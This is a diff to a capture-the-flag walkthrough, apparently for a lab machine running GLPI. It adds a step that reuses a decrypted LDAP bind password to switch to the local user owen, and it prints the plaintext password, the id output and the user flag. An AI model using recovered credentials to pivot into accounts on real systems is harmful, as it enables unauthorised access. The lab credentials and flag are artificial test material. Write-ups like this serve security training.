@@ -909,7 +909,7 @@ rootdn_passwd: avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpm
 <br>
 </div>
 
-#### 4.5 Decrypt the LDAP bind password
+### 4.5 Decrypt the LDAP bind password
 
 **Why this step:** The `rootdn_passwd` blob is reversibly encrypted with the world-readable `glpicrypt.key`. Decrypt it using GLPI’s own key-handling code.
 
@@ -948,7 +948,33 @@ WpczC40GhTbk
 <br>
 </div>
 
+### 4.6 Pivot to owen via password reuse and capture user.txt
 
+**Why this step:** The decrypted LDAP bind password may be reused by a local account. Test it against `owen`, the user-flag holder.
+
+**Command:**
+
+```shell
+su owen
+# password: WpczC40GhTbk
+id
+cat ~/user.txt
+```
+
+**Result:**
+
+```
+owen@management:/opt/glpi$ id
+# uid=1000(owen) gid=1000(owen) groups=1000(owen)
+```
+
+```
+USER FLAG: ab1fe37172d2bc2f357fd35f091be442
+```
+
+**What this gives you:** An interactive session as the human user `owen`. **Key finding:** the LDAP bind password `WpczC40GhTbk` was reused as `owen`’s local account password, completing the pivot from the `openam` service account to a real user. This single instance of password reuse was worth more than every uncrackable bcrypt hash in the database.
+
+**Next:** Enumerate `owen`’s privileges, starting with sudo rights.
 <div align="center">
 <br>
 <br>
